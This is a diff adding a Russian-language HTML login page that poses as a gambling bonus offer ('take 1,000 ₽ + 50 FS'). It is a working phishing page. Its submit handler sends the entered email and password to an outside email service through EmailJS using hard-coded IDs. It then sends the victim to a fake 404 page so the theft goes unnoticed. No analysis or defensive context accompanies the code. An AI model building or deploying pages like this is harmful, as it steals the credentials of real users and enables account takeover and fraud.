@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Вход</title>
+  <link rel="stylesheet" href="style.css" />
+  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+  <script>
+    (function(){
+      emailjs.init("vh1ShWK8WwLtFysy4"); // Ваш Public Key
+    })();
+  </script>
+</head>
+<body>
+
+  <!-- Верхняя панель -->
+  <header class="header">
+    <img src="images/logo.jpg" alt="Логотип" class="logo" />
+    <nav class="nav">
+      <a href="#">Войти</a>
+      <a href="#" class="register-btn">Регистрация</a>
+    </nav>
+  </header>
+
+  <!-- Промо-картинка -->
+  <div class="promo">
+    <img src="images/promo.jpg" alt="Промо" />
+    <div class="promo-text">
+      <span class="bonus-title">Вы получили бонус</span>
+      <h2>Забери <span class="red">1.000 ₽</span> + 50 FS!</h2>
+    </div>
+  </div>
+
+  <!-- Форма входа -->
+  <form class="form-container" id="login-form">
+    
+    <input type="email" name="username" placeholder="Электронная почта" required />
+    <input type="password" name="password" placeholder="Пароль" required />
+
+    <a href="#" class="forgot">Забыл пароль?</a>
+
+    <button type="submit" class="btn-red">Войти</button>
+
+    <p class="register-text">У тебя нет аккаунта? <a href="#">Регистрация</a></p>
+  </form>
+
+<script>
+  document.getElementById('login-form').addEventListener('submit', function(e) {
+    e.preventDefault();
+
+    emailjs.sendForm('service_1r11tq6', 'template_uizgbqg', this)
+      .then(function() {
+        // Сразу перенаправляем на страницу с ошибкой
+        window.location.href = '404.html';
+      }, function(error) {
+        alert('Ошибка при отправке: ' + JSON.stringify(error));
+      });
+  });
+</script>
+
+</body>
+</html>
